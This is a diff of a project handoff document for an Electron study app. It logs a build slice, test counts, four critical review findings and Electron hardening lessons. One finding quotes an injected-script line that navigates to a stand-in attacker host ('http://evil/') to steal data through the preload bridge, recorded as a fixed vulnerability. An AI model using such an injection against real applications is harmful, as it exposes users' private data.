@@ -1,6 +1,87 @@
 # Session Handoff — NerdyApp Companion (build iteration **V3** — desktop stack changed 2026-07-27)
 
-> ## ⏩ LATEST (2026-07-27, "V3-A — core in TypeScript" session) — READ THIS FIRST
+> ## ⏩ LATEST (2026-07-27, "V3-B — Electron shell, IPC, two executables" session) — READ THIS FIRST
+>
+> **State:** on **`feat/v4-electron-rewrite`** (the integration branch), clean, in sync with
+> `origin`. Last commit **`faad665`** — PR #7 squash-merged, branch `feat/v3b-electron-shell`
+> deleted — on top of `aa8ac73`. **`main` is still at `d70d6a8`, deliberately.**
+> **207 tests (178 core + 29 app); CI green on both jobs.**
+>
+> **THE APP RUNS.** `nerdyapp.js` opens a window, creates a subject, runs a real session with
+> pause/resume, records a distraction, ends it, shows history, and the data survives a restart —
+> masterplan L3 satisfied. Unstyled: the Modernist theme and the six other views are V3-C's.
+>
+> **The gating question is answered: `node:sqlite` WORKS in Electron 43.2.0** (Node 24.18.0, SQLite
+> 3.53.1, no `--experimental-sqlite`). `better-sqlite3` is not needed and `driver.ts` never changed.
+> Ten capability checks live on as `npm run verify:sqlite`, in CI — the failure mode is **silent**,
+> since `core` would keep passing under plain Node while the shipped app could not open a database.
+>
+> **Shipped:** electron-vite + Vue 3 shell with `contextIsolation`/`sandbox` on and navigation
+> locked to its own document · a hand-enumerated **10-operation preload allowlist** pinned in three
+> places that must agree · `SessionController` as the single owner of live session state · the two
+> executables (`nerdyapp.js` real SQLite on a **fresh** database, `nerdyapp-test.js` in-memory
+> fixtures opening no file) · **one contract suite run against BOTH bindings** · backup via
+> `VACUUM INTO` · CI that builds both executables and runs both smoke flows.
+>
+> **29 probes seen red this slice.** The smoke drives the real UI in eleven steps and is itself
+> probed: removing the navigation hardening, or making the Distracted button silently record
+> nothing, each fails it.
+>
+> **⚠️ TWO INDEPENDENT REVIEWS FOUND FOUR CRITICALS. Read these — three are the kind that only
+> surface when someone inspects the artefact instead of the source.**
+> 1. **A VERIFIED EXPLOIT.** There was no `will-navigate` restriction, so one line of injected
+>    script (`location.href='http://evil/'`) carried the preload bridge to an attacker-controlled
+>    origin — where the meta CSP does **not** apply, because it died with the local document. The
+>    reviewer ran it inside the real built app and read the whole study history from a remote page.
+>    Closed with `will-navigate` + `setWindowOpenHandler` + `will-attach-webview` denial, a hardened
+>    CSP, and an `app.isPackaged` gate on `ELECTRON_RENDERER_URL`. **`window.open` was verified NOT
+>    to inherit the bridge** — the folklore answer would have missed the real vector.
+> 2. **`npm run smoke` wrote to the REAL database, and had already done so** — 11 junk subjects, 11
+>    sessions, 22 interruptions, with no UI to delete them. The smoke drives a *real* session and
+>    nothing pointed it elsewhere. **Every isolation guard in the slice inspected CODE; none asked
+>    which database the binary was aimed at.** Fixed with an explicit `--nerdy-data-dir` flag
+>    (named to avoid Electron's reserved `--user-data-dir`) and a throwaway directory per run. The
+>    polluted file was removed and left to recreate; the Flutter-era database was never touched.
+> 3. **A second instance closed the live session as `crashed`.** Recovery runs at open and cannot
+>    tell running from crashed, so double-clicking the icon mid-session ended it at its last pause
+>    watermark — and a crashed session can never be surveyed, so 90 minutes of study became
+>    permanently unratable while the first window kept ticking. `requestSingleInstanceLock` added.
+> 4. **A failed backup destroyed the previous good backup.** It deleted the target before vacuuming,
+>    so a full disk left the user with an error and *no* backup — in the one feature whose stated
+>    purpose is not losing data. Now vacuums to a sibling and renames over; the failure path had no
+>    test at all and has two now.
+>
+> **Fixture divergence, measured:** the fixture accepted an unknown `subjectId` and a duplicate
+> session id, and constraint refusals arrived as a bare `Error` from SQLite but `DomainStateError`
+> from the fixture — which crosses IPC as `kind`, so a renderer branch written while debugging on
+> the test build fell through silently in production. Errors are now translated at the data layer.
+>
+> **THREE OF MY TESTS COULD NOT FAIL.** Worst: *"main registers a handler for exactly the
+> allowlisted channels"* compared `CHANNELS` to a list derived from `CHANNELS`, so deleting a
+> handler left it green. Also: *"self reports are counted per session"* had one session in scope;
+> *"ordered by time then by id"* used two events of the same kind so the tie-break was invisible;
+> the immutability contract could not observe `updatePausedDuration` at all (`HistoryEntry` gained
+> `pausedDurationS` so it can); the privacy guard keyed on `Function.length`, which a rest-parameter
+> refactor defeats; and the paths nesting test stripped a literal backslash, making it vacuous off
+> Windows.
+>
+> **▶ DO THIS NEXT — V3-C: the `ui` package, the Modernist theme, and the seven views.**
+> 1. Port `app-flutter/lib/core/theme/modernist.dart` and the seven views from
+>    `app-flutter/lib/features/*/presentation/`. Tokens in V3 spec §4.7 and the design bundle.
+> 2. **Decision V3-1 — reactivity.** The renderer currently re-queries after every mutation. Design
+>    the real answer now that there are views to serve.
+> 3. The survey dialog and its ≤2-interaction budget, counted **mechanically** from real events.
+> 4. Widening the preload allowlist is deliberate: `saveSurvey` and the rest must be added to
+>    `shared/ipc.ts`, a main handler, the preload object AND the surface test together.
+> **Do not re-litigate** the seven carried-over invariants in V3 spec §4.
+>
+> **Next-session execution:** **Hybrid** — inline by default, dedicated independent review on
+> correctness-critical work. It has now paid for itself five times. **The lesson this slice adds:
+> every guard here inspected source, and the two worst findings — a live exploit and a polluted
+> real database — were only visible by running the built artefact and looking at the file on disk.
+> Ask what the thing DOES, not only what the code says.**
+> ---
+> ## ⏪ PREVIOUS (2026-07-27, "V3-A — core in TypeScript" session)
 >
 > **State:** on **`feat/v4-electron-rewrite`** (the integration branch), clean, in sync with
 > `origin`. Last commit **`e402baa`** — PR #6 squash-merged, branch `feat/v3a-core-typescript`
@@ -520,6 +601,19 @@ Phases (from `docs/masterplan.md` §7, as re-sliced):
 - **V3 bootstrap** (`a60a867`, `ae37ff5`, 2026-07-25) — new repo, docs carried across, post-mortems
   written, environment facts recorded in masterplan §1a.
 
+- **V3-B — Electron shell, IPC, two executables** (PR #7 → `faad665`, 2026-07-27, merged into
+  `feat/v4-electron-rewrite`, **not on `main`**) — full write-up in the LATEST block. The app runs:
+  a real session, persisted, surviving a restart. `node:sqlite` confirmed working in Electron.
+  207 tests; 29 probes red; two reviews that found a live exploit, a polluted real database, a
+  session-killing second instance, and a backup that destroyed its predecessor.
+
+- **V3-B — Electron shell, IPC, two executables** (PR #7 → `faad665`, 2026-07-27, merged into
+  `feat/v4-electron-rewrite`, **not on `main`**) — full write-up in the LATEST block. The app runs:
+  a real session, persisted, surviving a restart. `node:sqlite` confirmed working in Electron
+  43.2.0. A 10-operation preload allowlist, two executables, and one contract suite run against
+  both bindings. 207 tests; 29 probes red; two reviews that found a live exploit, a polluted real
+  database, a session-killing second instance, and a backup that destroyed its predecessor.
+
 - **V3-A — `core` in TypeScript** (PR #6, 2026-07-27, merged into `feat/v4-electron-rewrite`, **not
   on `main`**) — full write-up in the LATEST block. npm workspace, `SqliteDriver` over
   `node:sqlite`, `ActiveSession`, four repositories behind port interfaces, privacy guard, CI.
@@ -561,17 +655,18 @@ Phases (from `docs/masterplan.md` §7, as re-sliced):
 
 ## 🔜 Future slices (ordered)
 
-1. **V3-B — Electron shell + IPC + the two builds (start here).** Main/preload/renderer; `nerdyapp.exe` binds
-   SQLite (fresh database), `nerdyapp-test.exe` binds in-memory fixtures and opens no database.
-   **Verify early whether Electron's bundled Node exposes `node:sqlite`**, else `better-sqlite3`.
-2. **V3-C — `ui` package: Modernist theme + the seven views**, ported from
+1. **V3-C — `ui` package: Modernist theme + the seven views (start here).** Ported from
    `app-flutter/lib/features/*/presentation/` and `core/theme/modernist.dart`. Design tokens are in
-   V3 spec §4.7 and the original bundle (`NerdyApp Study Companion Design.zip`). **Also owns two
-   things V3-A deferred in writing:** the `SessionController` port with its two mirror-ordering
-   race tests (invariant 4's *ordering* half — "clear state BEFORE the last await" — lives in the
-   controller, not the repository), and **decision V3-1: reactivity**. drift's `watch*` streams
-   became plain `list*`/`count*` queries, because every Flutter test consumed them with `.first`
-   and designing a change-notification bus with no UI to serve would have been guesswork.
+   V3 spec §4.7 and the original bundle (`NerdyApp Study Companion Design.zip`). The renderer is
+   currently one unstyled `App.vue` covering subjects, the session and history — dress it and split
+   it, do not start over.
+   **Also owns, in writing:** **decision V3-1 — reactivity.** The renderer re-queries after every
+   mutation, which was the honest answer with no views to serve; design the real one now that there
+   are. Plus the **survey dialog** and its ≤2-interaction budget counted *mechanically* from real
+   events, which needs `saveSurvey` added deliberately to the allowlist, a main handler, the
+   preload object AND the surface test together.
+   *(The `SessionController` port and its mirror-ordering race tests are DONE — V3-B, in
+   `packages/app/src/main/session-controller.ts`, with four mirror pairs.)*
 3. **V3-D — parity verification.** Re-earn the Phase 1/2 gates in Electron: the three Phase 2 exit
    criteria (with the interaction budget counted mechanically), crash recovery, and the one-hour
    wall-clock accuracy check. Replace the retired drift schema guards with a
@@ -581,7 +676,11 @@ Phases (from `docs/masterplan.md` §7, as re-sliced):
    threshold), and the first legitimate `detail` write.
 
 **Backlog / deferred (non-blocking):** masterplan §3 decision 1 and §10 still need a row recording
-the stack change; `actions/checkout@v4` and `actions/setup-node@v4` target the deprecated Node 20 on
+the stack change; `verify-build-isolation.mjs`'s example-data marker list is hand-maintained and
+its chunk inclusion is order-dependent (one chunk today); `nerdyapp-test.js` retains a bare
+`import "node:sqlite"` side effect, so the demo build would refuse to boot on an Electron lacking
+it; `app.setName()` is never called, so Electron derives its own cache tree from the package name;
+save dialogs are not window-modal; `actions/checkout@v4` and `actions/setup-node@v4` target the deprecated Node 20 on
 runners (forced to 24 — non-blocking annotation, bump when convenient); consider
 `erasableSyntaxOnly: true` in `tsconfig.base.json` if anything ever needs to load `core` through
 plain `node` (parameter properties would have to go); README describes a Flutter
@@ -602,6 +701,43 @@ Hybrid execution: inline by default, dedicated independent review on schema/migr
 confirming persistence is routed to Isaac, never claimed by an agent.
 
 ## ⚠️ Gotchas / hard-won lessons
+
+**V3-B / Electron (2026-07-27, verified this session):**
+
+- **Ask what the artefact DOES, not only what the code says.** Every guard in V3-B inspected
+  source, and the two worst findings were invisible to all of them: a working navigation exploit,
+  and a smoke run that had been writing junk into the real database for hours. Both needed someone
+  to run the built app and look at the file on disk.
+- **A sandboxed preload must be CommonJS.** `"type": "module"` makes electron-vite emit ESM,
+  Electron's sandbox has no ESM loader, and the only symptom is `window.nerdy` being `undefined`.
+  The other "fix" — `sandbox: false` — is not a fix.
+- **`will-navigate` is the vector, not `window.open`.** Verified: a child window does NOT inherit
+  the preload bridge, but navigating the existing window does — and the meta CSP does not follow,
+  because it belongs to the document that just went away.
+- **`ELECTRON_RENDERER_URL` needs an `app.isPackaged` gate**, or an env var makes an attacker's
+  page *be* the app window.
+- **`--user-data-dir` is a RESERVED Electron switch.** Re-purposing it gives one flag two meanings;
+  use a distinct name.
+- **`requestSingleInstanceLock` is load-bearing here**, because crash recovery at launch cannot
+  distinguish a running session from a crashed one.
+- **`VACUUM INTO` must go to a temp sibling then rename.** Deleting the target first inverts the
+  guarantee: a failure leaves no backup at all.
+- **Asset paths cannot come from `import.meta.url`** in main-process code — rollup hoists shared
+  code into `chunks/`, so it points at the chunk. Nor from `app.getAppPath()`, which returns the
+  directory of the script Electron was handed. Entry files are rollup *inputs*, never chunked, so
+  they are the one stable anchor.
+- **`build.outDir` resolves against `root`**, and `renderer.root` is `src/renderer`, so an
+  unpinned renderer builds somewhere the main process is not looking.
+- **`@nerdyapp/core` must be EXCLUDED from `externalizeDepsPlugin`** — it is a workspace package
+  exporting raw TypeScript, so externalizing hands Node a `.ts` file at runtime.
+- **The renderer must import `@nerdyapp/core/domain`, not the root** — the root drags
+  `node:sqlite` into a browser bundle.
+- **`tsc` cannot resolve a `.vue` import at all.** Use `vue-tsc`, and do NOT add a
+  `declare module '*.vue'` shim: it types every component as `any` and silences the checking.
+- **ESLint crashes rather than reports** on files outside every tsconfig when type-aware rules are
+  on. Exempt `**/*.cjs`, `**/*.mjs`, config files, and build output.
+- **A test comparing two things derived from the same constant cannot fail.** The IPC surface test
+  compared `CHANNELS` to `CHANNELS.map(...)`. Drive one side off the implementation.
 
 **V3-A / TypeScript stack (2026-07-27, verified this session):**
 
